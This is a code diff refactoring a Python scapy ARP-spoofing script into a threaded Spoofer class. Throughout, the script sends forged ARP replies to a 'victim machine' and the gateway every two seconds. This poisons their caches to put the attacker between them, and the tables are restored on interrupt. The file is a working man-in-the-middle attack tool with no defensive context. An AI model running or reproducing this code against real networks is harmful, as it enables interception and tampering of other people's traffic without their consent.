@@ -1,49 +1,70 @@
 import scapy.all as scapy
 import time
-import argparse
 import sys
-
-# targetIP: is Ip address of victim machine(10.0.2.4)
-# destinationMac: is Mac address of victim machine
-# spoofIP: is gatewayIP
-# op=2: represents the ARP packet is a response packet
+import os
+from threading import Thread
 
 
-destinationMac = '14-10-9F-E1-65-61'
-sourceMAC = '0C-9D-92-82-9F-26'
+class Spoofer:
+    # targetIP: is Ip address of victim machine(10.0.2.4)
+    # destinationMac: is Mac address of victim machine
+    # spoofIP: is gatewayIP
+    # op=2: represents the ARP packet is a response packet
+
+    def __init__(self, destinationMac, sourceMAC, gatewayIP, targetIP):
+        self.destinationMac = destinationMac
+        self.sourceMAC = sourceMAC
+        self.gatewayIP = gatewayIP
+        self.targetIP = targetIP
+        self.thread_running = True
+
+    # destinationMac = '14-10-9F-E1-65-61' MAYBE DONT NEED DESTINATION MAC
+    # sourceMAC = '0C-9D-92-82-9F-26'
 
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
-    return answered_list[1].hwsrc
+    def get_mac(self, ip):
+        ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, inter=0.1)
+        for snd, rcv in ans:
+            return rcv.sprintf(r"%Ether.src%")
+
+    def spoofer(self, targetIP, spoofIP):
+        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=self.destinationMac, psrc=spoofIP)
+        scapy.send(packet, verbose=False)
+
+    def restore(self, destinationIP, sourceIP):
+        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=self.get_mac(destinationIP), psrc=sourceIP, hwsrc=self.sourceMAC)
+        scapy.send(packet, count=4, verbose=False)
+
+    def spoof(self):
+
+        packets = 0
+
+        try:
+            while self.thread_running:
+                self.spoofer(self.targetIP, self.gatewayIP)
+                self.spoofer(self.gatewayIP, self.targetIP)
+                print("\r[+] Sent packets " + str(packets)),
+                sys.stdout.flush()
+                packets += 2
+                time.sleep(2)
+
+        except KeyboardInterrupt:
+            print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
+            self.restore(self.targetIP, self.gatewayIP)
+            self.restore(self.gatewayIP, self.targetIP)
+
+    def stop_spoof(self):
+        stop_signal = input('stop? : ')
+
+    def main(self):
+        t1 = Thread(target=self.spoof)
+        t2 = Thread(target=self.stop_spoof)
+
+        t1.start()
+        t2.start()
+
+        t2.join()  # interpreter will wait until your process get completed or terminated
+        self.thread_running = False
 
 
-def spoofer(targetIP, spoofIP):
-    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
-    scapy.send(packet, verbose=False)
 
-
-def restore(destinationIP, sourceIP):
-    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=get_mac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
-    scapy.send(packet, count=4, verbose=False)
-
-
-targetIP = '192.168.1.34'
-gatewayIP = '192.168.1.1'
-
-packets = 0
-try:
-    while True:
-        spoofer(targetIP, gatewayIP)
-        spoofer(gatewayIP, targetIP)
-        print("\r[+] Sent packets " + str(packets)),
-        sys.stdout.flush()
-        packets += 2
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
-    restore(targetIP, gatewayIP)
-    restore(gatewayIP, targetIP)
